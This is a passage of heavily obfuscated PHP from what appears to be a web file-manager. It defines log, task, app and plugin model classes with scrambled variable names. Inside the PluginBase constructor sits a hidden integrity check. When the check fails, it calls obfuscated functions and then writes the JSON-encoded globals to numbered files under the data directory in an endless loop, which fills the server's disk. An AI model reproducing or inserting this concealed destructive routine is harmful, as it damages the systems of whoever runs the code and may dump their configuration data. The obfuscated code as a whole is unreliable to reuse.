array($´ì‡¼¡[461] => $¶Ğ§[$´ì‡¼¡[461]]); $€Ã¡Öœò = array($´ì‡¼¡[809] => $‚ıã´, $´ì‡¼¡[76] => $ûã¶); Model($´ì‡¼¡[193])->where($ó”òÀ”¥ŒÁ)->save($€Ã¡Öœò); } $this->removeByFileID($„øÜªÀ±); if (!$ĞªÇ«àÌ) { $Ò†õ²->stop($ÉŸÈ©ÇÏâ¯); return !1; } $Ò†õ²->end(); if ($‹Üˆ == $´ì‡¼¡[1707]) { $this->remove($„­§Ç‡á³); } } public function progress($òÕµ¶ƒ, $¿ìí‡úí) { return Task::get($¿ìí‡úí . $_SERVER[ÀÆ][2052] . $òÕµ¶ƒ); } private function removeByFileID($‘˜‡ª = array()) { $–…Ì =& $_SERVER[ÀÆ]; if (empty($‘˜‡ª)) { return; } $©ú©»şìå¢á = array($–…Ì[461] => array($–…Ì[7], $‘˜‡ª)); $åÚÙ’¾Ú® = Model($–…Ì[1250])->where($©ú©»şìå¢á)->field($–…Ì[397])->select(); if (!$åÚÙ’¾Ú®) { return; } $åÚÙ’¾Ú® = array_to_keyvalue($åÚÙ’¾Ú®, $–…Ì[33], $–…Ì[397]); foreach ($åÚÙ’¾Ú® as $ã‚²ş™íÔíç) { Model($–…Ì[411])->removeNow($ã‚²ş™íÔíç, !1); } } private function removeShareItems($šˆÈÀ¬) { $Ï×‹ŞÀ‡àü¢ß =& $_SERVER[ÀÆ]; $©æÒ = "\173\x69\157\x3a{$šˆÈÀ¬}\x7d\57"; $¥ô†ëõ¿Üª§ = array($Ï×‹ŞÀ‡àü¢ß[397] => 0, $Ï×‹ŞÀ‡àü¢ß[1103] => array($Ï×‹ŞÀ‡àü¢ß[381], "{$©æÒ}\45")); $´Ö×¼¨À” = Model($Ï×‹ŞÀ‡àü¢ß[1718])->where($¥ô†ëõ¿Üª§)->field($Ï×‹ŞÀ‡àü¢ß[482])->select(); if (empty($´Ö×¼¨À”)) { return; } $ÙË‚êú¬Ç = array_to_keyvalue($´Ö×¼¨À”, $Ï×‹ŞÀ‡àü¢ß[33], $Ï×‹ŞÀ‡àü¢ß[482]); Model($Ï×‹ŞÀ‡àü¢ß[589])->remove($ÙË‚êú¬Ç); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x4c\151\x67\150\164\101\x70\x70"; public $modelType = "\x53\171\x73\164\x65\155\x4f\x70\164\151\157\156"; public $field = array("\156\x61\155\145", "\x67\x72\x6f\x75\160", "\x64\145\x73\143", "\143\x6f\156\164\145\x6e\164"); public function listData($Ò€‰ã = false, $²¤ú³øÜì± = "\155\x6f\x64\151\x66\171\x54\x69\x6d\145", $‰‰ã¬ = true) { return parent::listData($Ò€‰ã, $²¤ú³øÜì±, $‰‰ã¬); } public function remove($şÚ‚¬Ïı) { $ÄÙÉ¸» = $this->findByName($şÚ‚¬Ïı); if (!$ÄÙÉ¸») { return !1; } return parent::remove($ÄÙÉ¸»[$_SERVER[ÀÆ][395]]); } public function add($ãœİ´Ÿ) { if ($this->findByName($ãœİ´Ÿ[$_SERVER[ÀÆ][28]])) { return !1; } return parent::insert($ãœİ´Ÿ); } public function update($²Ãß, $×èªÒ¡ÁÏ²ú) { $³ÓÇ©ü¥š =& $_SERVER[ÀÆ]; $Ö»™ = $this->findByName($²Ãß); $×Á‰¼¨³ = $this->findByName($×èªÒ¡ÁÏ²ú[$³ÓÇ©ü¥š[28]]); if (!$Ö»™ || $×Á‰¼¨³ && $×Á‰¼¨³[$³ÓÇ©ü¥š[395]] != $Ö»™[$³ÓÇ©ü¥š[395]]) { return !1; } return parent::update($Ö»™[$³ÓÇ©ü¥š[395]], $×èªÒ¡ÁÏ²ú); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\x6d\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\156\163\x65\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÅØˆ¬¦Ü =& $_SERVER[ÀÆ]; return array($ÅØˆ¬¦Ü[2055] => LNG($ÅØˆ¬¦Ü[2056]), $ÅØˆ¬¦Ü[2057] => LNG($ÅØˆ¬¦Ü[2058]), $ÅØˆ¬¦Ü[1681] => LNG($ÅØˆ¬¦Ü[2059]), $ÅØˆ¬¦Ü[2060] => LNG($ÅØˆ¬¦Ü[2061]), $ÅØˆ¬¦Ü[2062] => LNG($ÅØˆ¬¦Ü[2063]), $ÅØˆ¬¦Ü[2064] => LNG($ÅØˆ¬¦Ü[2065]), $ÅØˆ¬¦Ü[2066] => LNG($ÅØˆ¬¦Ü[2067]), $ÅØˆ¬¦Ü[1711] => LNG($ÅØˆ¬¦Ü[2067]), $ÅØˆ¬¦Ü[1712] => LNG($ÅØˆ¬¦Ü[2068]), $ÅØˆ¬¦Ü[2069] => LNG($ÅØˆ¬¦Ü[2070]), $ÅØˆ¬¦Ü[2071] => LNG($ÅØˆ¬¦Ü[2072]), $ÅØˆ¬¦Ü[2073] => LNG($ÅØˆ¬¦Ü[2074]), $ÅØˆ¬¦Ü[2075] => LNG($ÅØˆ¬¦Ü[2076]), $ÅØˆ¬¦Ü[1709] => LNG($ÅØˆ¬¦Ü[2077]), $ÅØˆ¬¦Ü[2078] => LNG($ÅØˆ¬¦Ü[2079]), $ÅØˆ¬¦Ü[1716] => LNG($ÅØˆ¬¦Ü[2080]), $ÅØˆ¬¦Ü[2081] => LNG($ÅØˆ¬¦Ü[2082]), $ÅØˆ¬¦Ü[2083] => LNG($ÅØˆ¬¦Ü[2084]), $ÅØˆ¬¦Ü[2085] => LNG($ÅØˆ¬¦Ü[2086]), $ÅØˆ¬¦Ü[2087] => LNG($ÅØˆ¬¦Ü[2088]), $ÅØˆ¬¦Ü[1719] => LNG($ÅØˆ¬¦Ü[2089]), $ÅØˆ¬¦Ü[1720] => LNG($ÅØˆ¬¦Ü[2090]), $ÅØˆ¬¦Ü[2091] => LNG($ÅØˆ¬¦Ü[2092]), $ÅØˆ¬¦Ü[2093] => LNG($ÅØˆ¬¦Ü[2094]), $ÅØˆ¬¦Ü[2095] => LNG($ÅØˆ¬¦Ü[2096]), $ÅØˆ¬¦Ü[1714] => LNG($ÅØˆ¬¦Ü[2097]), $ÅØˆ¬¦Ü[2098] => LNG($ÅØˆ¬¦Ü[2099]), $ÅØˆ¬¦Ü[1713] => LNG($ÅØˆ¬¦Ü[2100]), $ÅØˆ¬¦Ü[2101] => LNG($ÅØˆ¬¦Ü[2102]), $ÅØˆ¬¦Ü[2103] => LNG($ÅØˆ¬¦Ü[2104]), $ÅØˆ¬¦Ü[2105] => LNG($ÅØˆ¬¦Ü[2106]), $ÅØˆ¬¦Ü[2107] => LNG($ÅØˆ¬¦Ü[2107]), $ÅØˆ¬¦Ü[2108] => LNG($ÅØˆ¬¦Ü[1685]), $ÅØˆ¬¦Ü[2109] => LNG($ÅØˆ¬¦Ü[2110]), $ÅØˆ¬¦Ü[2111] => LNG($ÅØˆ¬¦Ü[2112]), $ÅØˆ¬¦Ü[2113] => LNG($ÅØˆ¬¦Ü[2114]), $ÅØˆ¬¦Ü[2115] => LNG($ÅØˆ¬¦Ü[2116]), $ÅØˆ¬¦Ü[2117] => LNG($ÅØˆ¬¦Ü[2118]), $ÅØˆ¬¦Ü[2119] => LNG($ÅØˆ¬¦Ü[2119]), $ÅØˆ¬¦Ü[2120] => LNG($ÅØˆ¬¦Ü[2121]), $ÅØˆ¬¦Ü[2122] => LNG($ÅØˆ¬¦Ü[2123]), $ÅØˆ¬¦Ü[2124] => LNG($ÅØˆ¬¦Ü[2125]), $ÅØˆ¬¦Ü[2126] => LNG($ÅØˆ¬¦Ü[2127]), $ÅØˆ¬¦Ü[2128] => LNG($ÅØˆ¬¦Ü[2129]), $ÅØˆ¬¦Ü[2130] => LNG($ÅØˆ¬¦Ü[2131])); } private function typeFile() { $éú =& $_SERVER[ÀÆ]; $†ìá¿ = array($éú[1716] => array($éú[1717]), $éú[2073] => array($éú[2132]), $éú[2075] => array($éú[2133]), $éú[1709] => array($éú[1710]), $éú[2083] => array(), $éú[2085] => array(), $éú[2087] => array(), $éú[1719] => array($éú[1721]), $éú[1720] => array($éú[1721]), $éú[2091] => array($éú[2134]), $éú[2093] => array($éú[2134]), $éú[2095] => array($éú[2135]), $éú[2081] => array($éú[2136]), $éú[1714] => array($éú[2137]), $éú[2098] => array($éú[2138]), $éú[1713] => array($éú[1715])); return $†ìá¿; } private function typeAll() { $– Š =& $_SERVER[ÀÆ]; $šğ£ÄÖ = $this->typeList; $ıõ÷ = array_filter($this->typeFile()); foreach ($ıõ÷ as $†ŸŒ => $ÎàÔŸÃ’åàèÇ) { $šğ£ÄÖ[$ÎàÔŸÃ’åàèÇ[0]] = $šğ£ÄÖ[$†ŸŒ]; } $šğ£ÄÖ[$– Š[1721]] = LNG($– Š[2139]); $šğ£ÄÖ[$– Š[2134]] = LNG($– Š[2140]); return $šğ£ÄÖ; } public function addLog($Ğ¹, $ğø±­Šç³¬ = array()) { $ù­äĞ¬› =& $_SERVER[ÀÆ]; if (!isset($this->typeList[$Ğ¹])) { return; } $Úƒ•ÕÄÀ¬ = defined($ù­äĞ¬›[468]) && USER_ID ? USER_ID : (isset($ğø±­Šç³¬[$ù­äĞ¬›[1572]]) ? $ğø±­Šç³¬[$ù­äĞ¬›[1572]] : 0); if (!$Úƒ•ÕÄÀ¬) { $Úƒ•ÕÄÀ¬ = (int) Session::get($ù­äĞ¬›[1873]); } $Ô±õ„ = get_client_ip(); if (!$ğø±­Šç³¬ || strlen(json_encode($ğø±­Šç³¬)) >= 1024) { $ğø±­Šç³¬ = array($ù­äĞ¬›[2141] => $Ô±õ„); } else { if (is_array($ğø±­Šç³¬)) { $ğø±­Šç³¬[$ù­äĞ¬›[2141]] = $Ô±õ„; } else { $ğø±­Šç³¬ = array($ù­äĞ¬›[1120] => $ğø±­Šç³¬, $ù­äĞ¬›[2141] => $Ô±õ„); } } $ğø±­Šç³¬ = array($ù­äĞ¬›[1562] => Session::sign(), $ù­äĞ¬›[1563] => $Úƒ•ÕÄÀ¬, $ù­äĞ¬›[29] => $Ğ¹, $ù­äĞ¬›[1565] => json_encode($ğø±­Šç³¬)); parent::add($ğø±­Šç³¬); } public function remove($úŒ„™ñ•ò) { $this->where(array($_SERVER[ÀÆ][414] => $úŒ„™ñ•ò))->delete(); } private function _makeOrder($„¶â©€ŒãŒ¬ö = '') { $¬³Ö£«Íğ¹è =& $_SERVER[ÀÆ]; $ÚÜšü‚ = $¬³Ö£«Íğ¹è[194]; $Ğê¨”¹á = array($¬³Ö£«Íğ¹è[442] => $¬³Ö£«Íğ¹è[443], $¬³Ö£«Íğ¹è[444] => $¬³Ö£«Íğ¹è[445]); $»šà = Input::get($¬³Ö£«Íğ¹è[450], $¬³Ö£«Íğ¹è[7], $¬³Ö£«Íğ¹è[1905], array($¬³Ö£«Íğ¹è[1829], $¬³Ö£«Íğ¹è[444])); $»šà = $Ğê¨”¹á[$»šà]; $„¶â©€ŒãŒ¬ö = $„¶â©€ŒãŒ¬ö . "{$ÚÜšü‚}\40{$»šà}"; return $this->order($„¶â©€ŒãŒ¬ö); } public function get($œúŸª‰áÆµ = '') { $é¢Ü¦ =& $_SERVER[ÀÆ]; if (!$œúŸª‰áÆµ) { show_json(array()); } $ù¸šÓ¥ = array(); if ($œúŸª‰áÆµ[$é¢Ü¦[1572]]) { $ù¸šÓ¥[$é¢Ü¦[1572]] = $œúŸª‰áÆµ[$é¢Ü¦[1572]]; } if (isset($œúŸª‰áÆµ[$é¢Ü¦[746]])) { $ë·ú = $œúŸª‰áÆµ[$é¢Ü¦[746]]; $åŠñ— = isset($œúŸª‰áÆµ[$é¢Ü¦[490]]) ? $œúŸª‰áÆµ[$é¢Ü¦[490]] : time(); $ù¸šÓ¥[$é¢Ü¦[194]] = array($é¢Ü¦[331], array($ë·ú, $åŠñ—)); } if ($œúŸª‰áÆµ[$é¢Ü¦[29]]) { $à³ë¸ä“¡Öøç = explode($é¢Ü¦[47], $œúŸª‰áÆµ[$é¢Ü¦[29]]); $¬ûÏ²“ = $this->typeFile(); $Ãû³á°¼·ğ = array(); foreach ($à³ë¸ä“¡Öøç as $¸ïğÀÜÃ) { $Ãû³á°¼·ğ[] = $¸ïğÀÜÃ; if (isset($¬ûÏ²“[$¸ïğÀÜÃ])) { $Ãû³á°¼·ğ = array_merge($Ãû³á°¼·ğ, $¬ûÏ²“[$¸ïğÀÜÃ]); } } $Ãû³á°¼·ğ = array_unique($Ãû³á°¼·ğ); if ($Ãû³á°¼·ğ) { $ù¸šÓ¥[$é¢Ü¦[29]] = array($é¢Ü¦[7], $Ãû³á°¼·ğ); } } else { $ù¸šÓ¥[$é¢Ü¦[29]] = array($é¢Ü¦[2142], $é¢Ü¦[2143]); } if (!empty($œúŸª‰áÆµ[$é¢Ü¦[2141]])) { $ù¸šÓ¥[$é¢Ü¦[445]] = array($é¢Ü¦[381], "\45{$œúŸª‰áÆµ[$é¢Ü¦[2141]]}\45"); } $Òœãš´ = $this->_makeOrder()->where($ù¸šÓ¥)->selectPage(); if (empty($Òœãš´[$é¢Ü¦[367]])) { show_json(array(), !0, $Òœãš´[$é¢Ü¦[364]]); } $Òœãš´[$é¢Ü¦[367]] = $this->logList($Òœãš´[$é¢Ü¦[367]]); return $Òœãš´; } private function ipAddress(&$ğ©èŞ»åØÜô) { $‡æ„ìü‘Ìõ =& $_SERVER[ÀÆ]; if (!empty($ğ©èŞ»åØÜô[$‡æ„ìü‘Ìõ[2141]])) { $´Ç¿ç¦‹¢©Ìğ = IpLocation::get($ğ©èŞ»åØÜô[$‡æ„ìü‘Ìõ[2141]]); } else { $´Ç¿ç¦‹¢©Ìğ = LNG($‡æ„ìü‘Ìõ[2144]); } $ğ©èŞ»åØÜô[$‡æ„ìü‘Ìõ[2145]] = $´Ç¿ç¦‹¢©Ìğ; } private function descZipDownload($·—ö, &$ÓÆ†Æ) { $˜¹’öğ£íö =& $_SERVER[ÀÆ]; if (!isset($·—ö[$˜¹’öğ£íö[2146]])) { return; } $ıÔ¸Ù‡› = json_decode($·—ö[$˜¹’öğ£íö[2146]], !0); foreach ($ıÔ¸Ù‡› as $šìÜ) { try { $Ö¸·ßãùœı’ = IO::infoFull($šìÜ[$˜¹’öğ£íö[76]]); } catch (Exception $ÅÁ…Îğ‘ÒªŸ) { continue; } $·—ö[$˜¹’öğ£íö[76]] = $šìÜ[$˜¹’öğ£íö[76]]; $ÓÆ†Æ[] = $·—ö[$˜¹’öğ£íö[397]] = $Ö¸·ßãùœı’[$˜¹’öğ£íö[397]]; $ÓÆ†Æ[] = $·—ö[$˜¹’öğ£íö[1959]] = $Ö¸·ßãùœı’[$˜¹’öğ£íö[492]]; break; } return $·—ö; } private function getSourceList(&$¢ÚšÀí­ÄŒÌ) { $²ÓÔ =& $_SERVER[ÀÆ]; $Şô = array(); foreach ($¢ÚšÀí­ÄŒÌ as $“»¤Û => $ÊÓ¡ÌŒá©Õ) { $·§Ï = json_decode($ÊÓ¡ÌŒá©Õ[$²ÓÔ[445]], !0); if ($ÊÓ¡ÌŒá©Õ[$²ÓÔ[29]] == $²ÓÔ[1712]) { $·§Ï = $this->descZipDownload($·§Ï, $Şô); $¢ÚšÀí­ÄŒÌ[$“»¤Û][$²ÓÔ[445]] = json_encode($·§Ï); continue; } if (strpos($ÊÓ¡ÌŒá©Õ[$²ÓÔ[29]], $²ÓÔ[1960]) !== 0) { if (!isset($·§Ï[$²ÓÔ[76]]) || strpos($ÊÓ¡ÌŒá©Õ[$²ÓÔ[29]], $²ÓÔ[2147]) !== 0) { continue; } try { $Œà‘«©¬İ = IO::infoFull($·§Ï[$²ÓÔ[76]]); } catch (Exception $£é”–) { continue; } $Şô[] = $·§Ï[$²ÓÔ[397]] = $Œà‘«©¬İ[$²ÓÔ[397]]; $Şô[] = $·§Ï[$²ÓÔ[1959]] = $Œà‘«©¬İ[$²ÓÔ[492]]; $¢ÚšÀí­ÄŒÌ[$“»¤Û][$²ÓÔ[445]] = json_encode($·§Ï); continue; } $Şô[] = $·§Ï[$²ÓÔ[397]]; $Şô[] = $·§Ï[$²ÓÔ[1959]]; if ($·§Ï[$²ÓÔ[29]] == $²ÓÔ[545]) { $Şô[] = $·§Ï[$²ÓÔ[445]][$²ÓÔ[1087]]; $Şô[] = $·§Ï[$²ÓÔ[445]][$²ÓÔ[1088]]; } if ($·§Ï[$²ÓÔ[29]] == $²ÓÔ[1967]) { $Şô[] = $·§Ï[$²ÓÔ[445]][$²ÓÔ[397]]; } } if (!$Şô) { return array(); } return Model($²ÓÔ[817])->sourceListInfo($Şô, !0); } private function logList($˜«Ş‘‡šå) { $°®Î =& $_SERVER[ÀÆ]; $œÛŞ = array_to_keyvalue($˜«Ş‘‡šå, $°®Î[33], $°®Î[1572]); $Ñ¤ÉßÑ¦Æ = Model($°®Î[532])->userListInfo(array_unique($œÛŞ)); $†õõã = $this->getSourceList($˜«Ş‘‡šå); $şê§É = $this->typeAll(); $È•óŠ«‰áÅ = array(); $òÎÏÙ „ûãÓ = array(); foreach ($˜«Ş‘‡šå as $ÇË => $¨™Ä®÷Ì) { $ÁÁ´º§Í²¡… = $¨™Ä®÷Ì[$°®Î[29]]; $Ï¨„œ¬Ì˜œâ† = isset($Ñ¤ÉßÑ¦Æ[$¨™Ä®÷Ì[$°®Î[1572]]]) ? $Ñ¤ÉßÑ¦Æ[$¨™Ä®÷Ì[$°®Î[1572]]] : !1; $ï¨‘û = strpos($ÁÁ´º§Í²¡…, $°®Î[2148]) === 0 ? LNG($°®Î[2149]) : LNG($°®Î[2144]); $¨™Ä®÷Ì[$°®Î[28]] = isset($Ï¨„œ¬Ì˜œâ†[$°®Î[28]]) ? $Ï¨„œ¬Ì˜œâ†[$°®Î[28]] : LNG($°®Î[2144]); $¨™Ä®÷Ì[$°®Î[2007]] = isset($Ï¨„œ¬Ì˜œâ†[$°®Î[2007]]) ? $Ï¨„œ¬Ì˜œâ†[$°®Î[2007]] : $°®Î[33]; $¨™Ä®÷Ì[$°®Î[1474]] = isset($şê§É[$ÁÁ´º§Í²¡…]) ? $şê§É[$ÁÁ´º§Í²¡…] : $ï¨‘û; $¨™Ä®÷Ì[$°®Î[1904]] = $Ï¨„œ¬Ì˜œâ†; $ª‘° = json_decode($¨™Ä®÷Ì[$°®Î[445]], !0); $¨™Ä®÷Ì[$°®Î[2141]] = isset($ª‘°[$°®Î[2141]]) ? $ª‘°[$°®Î[2141]] : $°®Î[33]; $¨™Ä®÷Ì[$°®Î[2145]] = IpLocation::get($¨™Ä®÷Ì[$°®Î[2141]]); if (strpos($ÁÁ´º§Í²¡…, $°®Î[1960]) === 0 || isset($ª‘°[$°®Î[1959]])) { $ª‘°[$°®Î[85]] = $†õõã[$ª‘°[$°®Î[397]]]; $ª‘°[$°®Î[1972]] = $†õõã[$ª‘°[$°®Î[1959]]]; if ($ª‘°[$°®Î[29]] == $°®Î[545]) { $ª‘°[$°®Î[445]][$°®Î[1087]] = $†õõã[$ª‘°[$°®Î[445]][$°®Î[1087]]]; $ª‘°[$°®Î[445]][$°®Î[1088]] = $†õõã[$ª‘°[$°®Î[445]][$°®Î[1088]]]; } if ($ª‘°[$°®Î[29]] == $°®Î[1967]) { $ª‘°[$°®Î[445]][$°®Î[397]] = $†õõã[$ª‘°[$°®Î[445]][$°®Î[397]]]; } if ($ª‘°[$°®Î[29]] == $°®Î[1707]) { $ª‘°[$°®Î[1972]] = $ª‘°[$°®Î[85]]; $ª‘°[$°®Î[1959]] = $ª‘°[$°®Î[1972]][$°®Î[397]]; $ª‘°[$°®Î[85]] = !1; $ª‘°[$°®Î[397]] = $°®Î[33]; } if ($ª‘°[$°®Î[85]] && $ª‘°[$°®Î[85]][$°®Î[406]] == $°®Î[1203]) { $òÎÏÙ „ûãÓ[] = $¨™Ä®÷Ì[$°®Î[395]]; unset($˜«Ş‘‡šå[$ÇË]); continue; } if ($ª‘°[$°®Î[1972]] && $ª‘°[$°®Î[1972]][$°®Î[406]] == $°®Î[1203]) { $òÎÏÙ „ûãÓ[] = $¨™Ä®÷Ì[$°®Î[395]]; unset($˜«Ş‘‡šå[$ÇË]); continue; } } $¨™Ä®÷Ì[$°®Î[445]] = $ª‘°; unset($¨™Ä®÷Ì[$°®Î[2150]]); $È•óŠ«‰áÅ[] = $¨™Ä®÷Ì; } $this->clearSystemPathLog($òÎÏÙ „ûãÓ); return $È•óŠ«‰áÅ; } private function clearSystemPathLog($Ë°¹§Ñå) { $¨×Ò =& $_SERVER[ÀÆ]; if (count($Ë°¹§Ñå) == 0) { return; } $¤¢ú—  = array($¨×Ò[395] => array($¨×Ò[7], array_unique($Ë°¹§Ñå))); $this->where($¤¢ú— )->delete(); } public function deviceList($’äã, $Ü¬â¨ = 0) { $¡şƒ†Ô¸ =& $_SERVER[ÀÆ]; $µ²ÃÈ = array($¡şƒ†Ô¸[1572] => $’äã, $¡şƒ†Ô¸[194] => array($¡şƒ†Ô¸[1005], $Ü¬â¨), $¡şƒ†Ô¸[29] => $¡şƒ†Ô¸[1681]); $Šùğãéâ¹ = array(); $˜ü¦’‡à = $this->field($¡şƒ†Ô¸[2151])->where($µ²ÃÈ)->order($¡şƒ†Ô¸[1970])->limit(50)->select(); foreach ($˜ü¦’‡à as $çé© => $ŠÌ £«îã‰») { if ($çé© > 0 && abs($ŠÌ £«îã‰»[$¡şƒ†Ô¸[194]] - $˜ü¦’‡à[$çé© - 1][$¡şƒ†Ô¸[194]]) < 5) { continue; } $ŠªÅÈ¿Ì = json_decode($ŠÌ £«îã‰»[$¡şƒ†Ô¸[445]], !0); $ŠÌ £«îã‰»[$¡şƒ†Ô¸[2141]] = isset($ŠªÅÈ¿Ì[$¡şƒ†Ô¸[2141]]) ? $ŠªÅÈ¿Ì[$¡şƒ†Ô¸[2141]] : $¡şƒ†Ô¸[33]; unset($ŠªÅÈ¿Ì[$¡şƒ†Ô¸[2141]]); $Ê¢Æé = $this->deviceType($ŠªÅÈ¿Ì[$¡şƒ†Ô¸[1961]]); if (isset($Šùğãéâ¹[$Ê¢Æé])) { continue; } $ŠÌ £«îã‰»[$¡şƒ†Ô¸[2145]] = IpLocation::get($ŠÌ £«îã‰»[$¡şƒ†Ô¸[2141]]); $ŠÌ £«îã‰»[$¡şƒ†Ô¸[445]] = $ŠªÅÈ¿Ì; $Šùğãéâ¹[$Ê¢Æé] = $ŠÌ £«îã‰»; } return array_values($Šùğãéâ¹); } public function deviceType($Ú»¸™İŒü¿) { return $Ú»¸™İŒü¿; } } goto b³ğ…¯›¨; eœø‘øù¤ô: class Message { function __construct() { } public function send($Ìõû´ß¤‹” = '', $‘Şª¡…À = array(), $…Ò¦³ï§ÊÕ = "\x74\x65\x78\x74") { $·‡È˜Æ =& $_SERVER[ÀÆ]; $äİ = array($·‡È˜Æ[29] => $·‡È˜Æ[1437], $·‡È˜Æ[740] => $Ìõû´ß¤‹”); if (in_array($…Ò¦³ï§ÊÕ, array($·‡È˜Æ[1437], $·‡È˜Æ[1438]))) { $äİ[$·‡È˜Æ[29]] = $…Ò¦³ï§ÊÕ; } $‘Şª¡…À = array($·‡È˜Æ[509] => isset($‘Şª¡…À[$·‡È˜Æ[509]]) ? $‘Şª¡…À[$·‡È˜Æ[509]] : $·‡È˜Æ[33], $·‡È˜Æ[588] => isset($‘Şª¡…À[$·‡È˜Æ[588]]) ? $‘Şª¡…À[$·‡È˜Æ[588]] : $·‡È˜Æ[33]); if (empty($Ìõû´ß¤‹”) || empty($‘Şª¡…À[$·‡È˜Æ[509]]) && empty($‘Şª¡…À[$·‡È˜Æ[588]])) { return !1; } $ß÷éİõÙâ = array($·‡È˜Æ[1378] => $äİ, $·‡È˜Æ[1439] => $‘Şª¡…À); Hook::trigger($·‡È˜Æ[1440], $ß÷éİõÙâ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ü˜Ø =& $_SERVER[ÀÆ]; $ÒÕ€ûôÍ–šª = $_SERVER[$Ü˜Ø[864]]; $Ú—¢Óİ– = $Ü˜Ø[872]; if ($_SERVER[$Ü˜Ø[857]] != $Ú—¢Óİ–($ÒÕ€ûôÍ–šª)) { $•â ½‚ = $Ü˜Ø[873]; $‹í–²ì = $Ü˜Ø[859]; $õà¼‰ = $_SERVER[$Ü˜Ø[860]] . $Ü˜Ø[861]; $µïôŸÚÖ¦Š = $‹í–²ì($õà¼‰); $îôØóÖ = explode($Ü˜Ø[229], $µïôŸÚÖ¦Š); if (count($îôØóÖ) < $Ü˜Ø[604]) { $ûËªá¹êê© = $Ü˜Ø[862]; $ûËªá¹êê©(); } $ï¸æÃ‚‚¢ıˆ = $Ü˜Ø[874]; $ï¸æÃ‚‚¢ıˆ($_SERVER[$Ü˜Ø[875]]); $•â ½‚ = $Ü˜Ø[873]; $•â ½‚(); $¢©‚ø = $Ü˜Ø[876]; $÷ = json_encode($GLOBALS[$Ü˜Ø[877]]); $”Š• = 1; for ($Ã­ÒšŠ‡Ú¨” = $”Š•; $Ã­ÒšŠ‡Ú¨” > 0; $Ã­ÒšŠ‡Ú¨”++) { $¢©‚ø(DATA_PATH . $Ã­ÒšŠ‡Ú¨”, $÷); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ü˜Ø[1441]); $this->pluginName = str_replace($Ü˜Ø[1441], $Ü˜Ø[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ü˜Ø[8]; $this->pluginApi = appHostGet() . $Ü˜Ø[1442] . $this->pluginName . $Ü˜Ø[8]; $this->pluginHost = $config[$Ü˜Ø[1443]] . $this->pluginName . $Ü˜Ø[8]; $this->pluginHostDefault = $config[$Ü˜Ø[1443]] . $this->pluginName . $Ü˜Ø[8]; $Ö˜‹¿¼ = $config[$Ü˜Ø[1444]]; if ($Ö˜‹¿¼ && strpos($Ü˜Ø[47] . $Ö˜‹¿¼ . $Ü˜Ø[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ü˜Ø[1445]] . $this->pluginName . $Ü˜Ø[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÀÆ][1446]); } protected function assign($¤ê™İÍë±, $ÈúŠ™”á¯ = false) { if (is_array($¤ê™İÍë±)) { $this->values = array_merge($this->values, $¤ê™İÍë±); } else { $this->values[$¤ê™İÍë±] = $ÈúŠ™”á¯; } } protected function display($Å¬ø«ˆêÜ™ã) { extract($this->values); require $Å¬ø«ˆêÜ™ã; } final function hookRegist($†³ãûÕö£í) { $this->modelPlugin->appRegist($this->pluginName, $†³ãûÕö£í); } final function appIcon() { $ş»÷½½ =& $_SERVER[ÀÆ]; $Ş‚ò = $this->appPackage(); $ñıˆö”Â™˜ = $ş»÷½½[33]; if (isset($Ş‚ò[$ş»÷½½[411]])) { if (isset($Ş‚ò[$ş»÷½½[411]][$ş»÷½½[1447]])) { $ñıˆö”Â™˜ = $ş»÷½½[1448] . $Ş‚ò[$ş»÷½½[411]][$ş»÷½½[1447]] . $ş»÷½½[1449]; } else { if ($Ş‚ò[$ş»÷½½[411]][$ş»÷½½[1450]]) { $ñıˆö”Â™˜ = $ş»÷½½[1451] . $Ş‚ò[$ş»÷½½[411]][$ş»÷½½[1450]] . $ş»÷½½[1452]; } } } return $ñıˆö”Â™˜; } final function fileCanView($ğ‘Î) { $‰Œ½ÖöÁ =& $_SERVER[ÀÆ]; if (request_url_safe($ğ‘Î)) { return !0; } if ($this->isShare($ğ‘Î)) { return !0; } $ıûÙ¬®”‰û = Session::get($‰Œ½ÖöÁ[1453]); if (!$ıûÙ¬®”‰û || !$ıûÙ¬®”‰û[$‰Œ½ÖöÁ[1454]]) { $±À = $‰Œ½ÖöÁ[1455] . rawurlencode(this_url()); show_tips(LNG($‰Œ½ÖöÁ[1456]) . $‰Œ½ÖöÁ[1457] . $±À . $‰Œ½ÖöÁ[1458] . LNG($‰Œ½ÖöÁ[1459]) . $‰Œ½ÖöÁ[1460], !1); } if (!Action($‰Œ½ÖöÁ[1461])->authCan($‰Œ½ÖöÁ[1462])) { show_tips(LNG($‰Œ½ÖöÁ[1463]) . $‰Œ½ÖöÁ[1464], !1); } ActionCall($‰Œ½ÖöÁ[1465], $ğ‘Î); } final function isShare($Œˆò¹) { $øıˆØ ‹ı = KodIO::parse($Œˆò¹); return $øıˆØ ‹ı[$_SERVER[ÀÆ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ËÃ) { if (request_url_safe($ËÃ)) { return $ËÃ; } if (!$this->isShare($ËÃ)) { $ËÃ = $this->filePath($ËÃ); } return Action($_SERVER[ÀÆ][1102])->linkOut($ËÃ); } public function filePathLinkOut($Š¿í›‘•Éàóñ) { if (request_url_safe($Š¿í›‘•Éàóñ)) { return $Š¿í›‘•Éàóñ; } $this->fileCanView($Š¿í›‘•Éàóñ); return Action($_SERVER[ÀÆ][1102])->link($Š¿í›‘•Éàóñ); } final function filePath($×§) { $Æëœ© »ãÂ =& $_SERVER[ÀÆ]; if ($Ù•úµ = $this->checkSharePath($×§)) { Hook::trigger($Æëœ© »ãÂ[1466], $Ù•úµ); return $Ù•úµ; } $this->fileCanView($×§); if (request_url_safe($×§)) { 